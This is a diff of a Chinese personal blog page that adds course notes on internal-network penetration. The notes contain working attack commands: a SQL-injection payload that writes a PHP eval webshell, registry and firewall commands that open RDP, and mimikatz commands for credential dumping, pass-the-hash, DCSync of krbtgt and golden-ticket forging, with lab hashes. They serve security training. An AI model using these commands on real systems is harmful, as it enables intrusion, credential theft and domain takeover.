@@ -20,17 +20,19 @@
     var CONFIG = {"hostname":"dtxharry.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="随便写点自己的笔记">
+  <meta name="description" content="比较详细的一些内网渗透的笔记">
 <meta property="og:type" content="article">
 <meta property="og:title" content="内网渗透">
 <meta property="og:url" content="https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="Dtx&#39;s Realm">
-<meta property="og:description" content="随便写点自己的笔记">
+<meta property="og:description" content="比较详细的一些内网渗透的笔记">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-08-21T08:51:15.000Z">
-<meta property="article:modified_time" content="2023-08-21T08:51:15.135Z">
+<meta property="article:modified_time" content="2023-08-21T15:21:15.362Z">
 <meta property="article:author" content="dtxHarry">
-<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="域控">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="https://dtxharry.github.io/2023/08/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
@@ -222,11 +224,22 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-08-21 16:51:15" itemprop="dateCreated datePublished" datetime="2023-08-21T16:51:15+08:00">2023-08-21</time>
+              <time title="创建时间：2023-08-21 16:51:15 / 修改时间：23:21:15" itemprop="dateCreated datePublished" datetime="2023-08-21T16:51:15+08:00">2023-08-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
             </span>
 
           
+            <div class="post-description">比较详细的一些内网渗透的笔记</div>
 
         </div>
       </header>
@@ -237,7 +250,64 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <p>SQL注入：拿到了数据库信息、拿到了管理员账号密码。然后找不到后台。<br>SQL注入  Getshell =&gt; DNS注入的课程<br>    <strong>into dumpfile</strong>  =&gt; 将SQL语句执行结果导出到XXX文件<br>    <strong>into outfile</strong>      =&gt; 将SQL语句执行结果导出到XXX文件<br>        into dumpfile ‘c:/phpstudy/www/77.php’</p>
+<p>想让目标报错，最简单的办法 id<strong>[]</strong>=1<br>        2 and 1=2  union select 1,’&lt;?php eval($_REQUEST[8])?&gt;’ into dumpfile ‘c:/phpstudy/www/78.php’</p>
+<h1 id="判断自己的账号是否是管理员"><a href="#判断自己的账号是否是管理员" class="headerlink" title="判断自己的账号是否是管理员"></a>判断自己的账号是否是管理员</h1><p>​        net localgroup administrators</p>
+<h1 id="提权（低权限用技术手段弄成高权限）"><a href="#提权（低权限用技术手段弄成高权限）" class="headerlink" title="提权（低权限用技术手段弄成高权限）"></a>提权（低权限用技术手段弄成高权限）</h1><h2 id="第三方应用提权："><a href="#第三方应用提权：" class="headerlink" title="第三方应用提权："></a>第三方应用提权：</h2><p>​            Mysql是高权限（UDF提权）<br>​            PHP是低权限 =&gt; 用PHP去操作Mysql,然后让mysql帮我执行恶意命令</p>
+<h2 id="系统漏洞提权法："><a href="#系统漏洞提权法：" class="headerlink" title="系统漏洞提权法："></a>系统漏洞提权法：</h2><p>​        操作系统也会有漏洞？<br>​        操作系统漏洞没学过，而且就算写了文章给你，你也不会呀。</p>
+<p>​         Microsoft Windows Server 2008 R2 Standard </p>
+<p>​         <a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p>
+<h1 id="把用户加入管理员组"><a href="#把用户加入管理员组" class="headerlink" title="把用户加入管理员组"></a>把用户加入管理员组</h1><p>​        net localgroup administrators a /add</p>
+<p><strong>一个Ip下可能有几个机器：一定是1个吗？很多很多个</strong></p>
+<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h2 id="1、正向连接："><a href="#1、正向连接：" class="headerlink" title="1、正向连接："></a>1、正向连接：</h2><p>​        webshell传递的数据有限，你想连接3389,想走数据webshell干不到</p>
+<p>​        设置中转站：</p>
+<p>​            我 -&gt; 目标的一个PHP文件 -&gt; 让目标去帮我的发起网络请求</p>
+<p>​            PHP很强大，他可以发起网络请求吗？ 可以 </p>
+<h3 id="如何让远程桌面的数据请求发到中转PHP上？"><a href="#如何让远程桌面的数据请求发到中转PHP上？" class="headerlink" title="如何让远程桌面的数据请求发到中转PHP上？"></a>如何让远程桌面的数据请求发到中转PHP上？</h3><p>​                1、本地设置代理，把数据转到本地的某个端口<br>​                2、做转接，监听某个端口，然后将端口的数据发送到中转PHP上</p>
+<p>​            <strong>远程连接：127.0.0.1 不可以连接</strong><br>​            </p>
+<h2 id="2、反向连接（反弹shell，木马）-目标"><a href="#2、反向连接（反弹shell，木马）-目标" class="headerlink" title="2、反向连接（反弹shell，木马） 目标"></a>2、反向连接（反弹shell，木马） 目标</h2><p>​            <strong>必须有网</strong><br>​            上网代表的是：插了网线，连接了互联网<br>​            有网：他可以主动去请求别人，并且可以通</p>
+<h2 id="3-正反连接选择"><a href="#3-正反连接选择" class="headerlink" title="3.     正反连接选择"></a>3.     正反连接选择</h2><p>​                反向连接要开VNC -  真实渗透，哪有人会直接远程桌面连接，这么大的动静<br>​                正向连接法，哪怕目标没有开启3389服务，你可以给他开<br>​                REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f<br>​                </p>
+<p>​            netsh firewall add portopening protocol = TCP port = 3389 name = rdp</p>
+<h1 id="内网渗透：渗透内网的机器？"><a href="#内网渗透：渗透内网的机器？" class="headerlink" title="内网渗透：渗透内网的机器？"></a>内网渗透：渗透内网的机器？</h1><p>​        重要的数据是不会放在网站上的，他应该放在内网里。<br>​        <strong>安全环境是：外紧内松 =&gt; 内网里面可以搞出很多东西</strong></p>
+<p>​            云WAF\设备防护 =&gt; 正常渗透的时候会防护你、内网渗透不会<br>​            安全设备是架设在网络入口的</p>
+<p>​        1、和web一样（端口扫描、网站测试）<br>​        2、端口扫描砸0day (永恒之蓝)<br>​        3、信息收集，找密码<br>​            内网里面的机器，可不可能同一个密码多个服务器使用？<br>​            密码是可以抓的，windows的密码是可以抓的<br>​            法国神器（猕猴桃）</p>
+<p>​            提升权限：privilege::debug<br>​            抓密码：sekurlsa::logonpasswords </p>
+<p>​            目标有什么主机。<br>​            直接给他装nmap ，直接开扫</p>
+<p>​            为什么抓到的密码是明文：<br>​                windows的低版本他就是明文的。<br>​                高版本他不是，但是也可以有利用方式（PTH）</p>
+<h1 id="内网渗透-域渗透"><a href="#内网渗透-域渗透" class="headerlink" title="内网渗透:域渗透"></a>内网渗透:域渗透</h1><h2 id="域："><a href="#域：" class="headerlink" title="域："></a>域：</h2><p>​            控制机：DC 域里面的管理员，权限极高，可以控制任意成员机<br>​            成员机：被控的小弟弟，只能被域控控制</p>
+<p>​    内网渗透的最高目的：拿下域控（域：200台机器。你只要拿下域控，200台机器都是你的）</p>
+<p>安装一个域。<br>        不知道密码如何更换： net user 用户名 密码</p>
+<h2 id="林"><a href="#林" class="headerlink" title="林:"></a>林:</h2><p>​    林 =&gt; 多个域组成林 =&gt; 1个域也是1个林</p>
+<p>​    <strong>1台成员机只可以加1个域，但是一个域可以多个域控</strong></p>
+<p>​    设置一个域名： 他是内网用的域名，所以可以随便写 qq.com</p>
+<p>​    这个qq.com是干什么？<br>​    其实每个域成员机，加入域控都会有自己的名字(域名，内网中的)<br>​    dc.qq.com<br>​    a1.qq.com<br>​    a45.qq.com<br>​    s3.qq.com<br>​    m2c.qq.com</p>
+<p>​    内网中的域名，优先级是高于外网。<br>​    我们是不是需要在内网中搭建DNS服务器。</p>
+<h3 id="如何知道目标是否在域中"><a href="#如何知道目标是否在域中" class="headerlink" title="如何知道目标是否在域中"></a>如何知道目标是否在域中</h3><p>​    <strong>systeminfo</strong><br>​        域:WORKGROUP 不在域中<br>​        域中：域名  zkaq.cn</p>
+<p>​            主机是域，会寻找域控，因为域控一般会搭建DNS服务器</p>
+<p>​            需要给目录服务还原模式设置：A1B2C3123456.</p>
+<p>​        域控：10.0.1.6</p>
+<p>​        域控的管理员账号 是可以 登录任意域主机</p>
+<p>​        如果域控的账号密码，登陆过目标机器？那是不是有方法获取？</p>
+<p>​        加入域的时候，填写的账户名和密码，是域控的账户名字和密码</p>
+<p>​        域访问：是需要标识</p>
+<p>​        正常情况下来说：<br>​            本地的账户密码 可以进入本机<br>​            域控的账户密码 也可进入域内主机</p>
+<h2 id="猕猴桃抓域控"><a href="#猕猴桃抓域控" class="headerlink" title="猕猴桃抓域控"></a>猕猴桃抓域控</h2><p>看不到明文密码。因为windows高版本都看不到，也可以打个补丁让人看不到。</p>
+<h3 id="1、哈希破解法"><a href="#1、哈希破解法" class="headerlink" title="1、哈希破解法"></a>1、哈希破解法</h3><p>​                根据windows的自带算法算出来的</p>
+<ul>
+<li>NTLM     : 61465a991b168727b65b3644aab823cd<br>SHA1     : 5b48c7f5a5facbb5df950bb501b9da8dcd86db3d<pre><code>    我拿一本弱密码字典，我也可以通过windows的算法去算。算出来的值和密文的就是密码(为什么不直接暴破3389?速度慢[hashcat])
+</code></pre></li>
+</ul>
+<h3 id="2、哈希传递法【pth】"><a href="#2、哈希传递法【pth】" class="headerlink" title="2、哈希传递法【pth】"></a>2、哈希传递法【pth】</h3><p>​            数据库是存明文密码、密文密码。<br>​            所以理论上而言，你传密文密码，和数据库校验的时候是可以通过<br>​            找到一个，可以和目标交互，可以用密文交互登录的地方就可以用它账号了[windows是有的]</p>
+<p>​    sekurlsa::pth /user:administrator /domain:”zkaq.cn” /ntlm:61465a991b168727b65b3644aab823cd </p>
+<p>​    哈希传递拿下域控</p>
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>​    黄金票据 =&gt; 通信证<br>​    我们正常的登录是需要通过账号密码校验。我们哈希传递之后，我们拿到了的cmd【渗透测试一般不会直接加账号】<br>​    我们怎么长久控制？ 只要他修改了密码，你就不能哈希传递<br>​    做通信证，直接不用过账号密码。</p>
+<p>​    lsadump::dcsync /user:krbtgt  </p>
+<p>​        获取krbtgt账户的信息（域安装的默认账号）</p>
+<p>​        Hash NTLM: 9f7afad7acc9f72b7e338b908795b7da<br>​        Object Security ID   : S-1-5-21-4098506371-3349406080-1400905760-502<br>​        Object Relative ID   : 502</p>
+<p>​        kerberos::golden /admin:administrator /domain:zkaq.cn /sid:S-1-5-21-4098506371-3349406080-1400905760 /krbtgt:9f7afad7acc9f72b7e338b908795b7da /ticket:411.kiribi  </p>
+<p>​        用票据去访问，得域名</p>
+<p>​        krbtgt 这个域控服务所需账号进的</p>
+
     </div>
 
     
@@ -262,6 +332,11 @@
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"># 内网渗透</a>
+              <a href="/tags/%E5%9F%9F%E6%8E%A7/" rel="tag"># 域控</a>
+          </div>
 
         
 
@@ -335,6 +410,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E8%87%AA%E5%B7%B1%E7%9A%84%E8%B4%A6%E5%8F%B7%E6%98%AF%E5%90%A6%E6%98%AF%E7%AE%A1%E7%90%86%E5%91%98"><span class="nav-text">判断自己的账号是否是管理员</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%EF%BC%88%E4%BD%8E%E6%9D%83%E9%99%90%E7%94%A8%E6%8A%80%E6%9C%AF%E6%89%8B%E6%AE%B5%E5%BC%84%E6%88%90%E9%AB%98%E6%9D%83%E9%99%90%EF%BC%89"><span class="nav-text">提权（低权限用技术手段弄成高权限）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%94%E7%94%A8%E6%8F%90%E6%9D%83%EF%BC%9A"><span class="nav-text">第三方应用提权：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E6%B3%95%EF%BC%9A"><span class="nav-text">系统漏洞提权法：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%8A%E7%94%A8%E6%88%B7%E5%8A%A0%E5%85%A5%E7%AE%A1%E7%90%86%E5%91%98%E7%BB%84"><span class="nav-text">把用户加入管理员组</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="nav-text">内网穿透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%EF%BC%9A"><span class="nav-text">1、正向连接：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E8%AE%A9%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82%E5%8F%91%E5%88%B0%E4%B8%AD%E8%BD%ACPHP%E4%B8%8A%EF%BC%9F"><span class="nav-text">如何让远程桌面的数据请求发到中转PHP上？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5%EF%BC%88%E5%8F%8D%E5%BC%B9shell%EF%BC%8C%E6%9C%A8%E9%A9%AC%EF%BC%89-%E7%9B%AE%E6%A0%87"><span class="nav-text">2、反向连接（反弹shell，木马） 目标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%AD%A3%E5%8F%8D%E8%BF%9E%E6%8E%A5%E9%80%89%E6%8B%A9"><span class="nav-text">3.     正反连接选择</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9A%E6%B8%97%E9%80%8F%E5%86%85%E7%BD%91%E7%9A%84%E6%9C%BA%E5%99%A8%EF%BC%9F"><span class="nav-text">内网渗透：渗透内网的机器？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="nav-text">内网渗透:域渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%EF%BC%9A"><span class="nav-text">域：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%97"><span class="nav-text">林:</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E7%9F%A5%E9%81%93%E7%9B%AE%E6%A0%87%E6%98%AF%E5%90%A6%E5%9C%A8%E5%9F%9F%E4%B8%AD"><span class="nav-text">如何知道目标是否在域中</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8C%95%E7%8C%B4%E6%A1%83%E6%8A%93%E5%9F%9F%E6%8E%A7"><span class="nav-text">猕猴桃抓域控</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%93%88%E5%B8%8C%E7%A0%B4%E8%A7%A3%E6%B3%95"><span class="nav-text">1、哈希破解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%B3%95%E3%80%90pth%E3%80%91"><span class="nav-text">2、哈希传递法【pth】</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-text">黄金票据</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,13 +433,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-count">32</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
